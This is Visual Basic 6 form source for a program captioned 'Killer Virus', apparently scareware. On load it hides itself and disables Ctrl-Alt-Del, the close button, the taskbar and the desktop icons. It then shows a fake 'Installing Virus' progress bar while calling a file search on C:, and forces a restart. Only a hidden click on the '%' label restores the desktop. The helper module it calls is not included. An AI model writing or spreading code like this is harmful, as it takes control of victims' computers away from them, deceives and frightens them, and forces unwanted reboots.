VERSION 5.00
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Begin VB.Form frmMain 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Killer Virus..."
   ClientHeight    =   1470
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   6840
   Icon            =   "frmMain.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   1470
   ScaleWidth      =   6840
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Begin VB.Timer Timer1 
      Interval        =   1
      Left            =   960
      Top             =   240
   End
   Begin MSComctlLib.ProgressBar ProgressBar1 
      Height          =   255
      Left            =   540
      TabIndex        =   0
      Top             =   960
      Width           =   5775
      _ExtentX        =   10186
      _ExtentY        =   450
      _Version        =   393216
      Appearance      =   1
   End
   Begin VB.Label Label2 
      Alignment       =   2  'Center
      Caption         =   "Installing Virus"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   2393
      TabIndex        =   3
      Top             =   0
      Width           =   2055
   End
   Begin VB.Label Label1 
      Caption         =   "%"
      Height          =   255
      Left            =   3540
      TabIndex        =   2
      Top             =   600
      Width           =   255
   End
   Begin VB.Label lblPercent 
      Alignment       =   1  'Right Justify
      Height          =   255
      Left            =   3060
      TabIndex        =   1
      Top             =   600
      Width           =   375
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Const MF_BYPOSITION = &H400&
Private Const MF_REMOVE = &H1000&


Private Declare Function GetSystemMenu Lib "user32" _
        (ByVal hWnd As Long, ByVal bRevert As Long) As Long


Private Declare Function GetMenuItemCount Lib "user32" _
        (ByVal hMenu As Long) As Long


Private Declare Function DrawMenuBar Lib "user32" _
        (ByVal hWnd As Long) As Long


Private Declare Function RemoveMenu Lib "user32" _
        (ByVal hMenu As Long, ByVal nPosition As Long, _
        ByVal wFlags As Long) As Long

Private Sub Form_Load()
App.TaskVisible = False
modStuff.DisableX
modStuff.CTRL_ALT_DEL_Disabled
modStuff.DesktopIconsHide
modStuff.TaskBarHide
modStuff.MinimizeAll

End Sub

Private Sub Label1_Click()
modStuff.CTRL_ALT_DEL_Enabled
modStuff.DesktopIconsShow
modStuff.TaskBarShow
End
End Sub

Private Sub Timer1_Timer()
If ProgressBar1.Value = 100 Then Timer1.Enabled = False
If Timer1.Enabled = True Then
ProgressBar1.Value = ProgressBar1.Value + 1
modStuff.FilesSearch "C:", "\"
End If
ProgressBar1.Visible = True
lblPercent.Caption = ProgressBar1.Value
If ProgressBar1.Value = 100 Then
MsgBox "The virus files are fisnished copying. Your computer will now restart to complete the installation.", vbOKOnly, "Finished"
modStuff.Restart
Unload Me
End If
End Sub

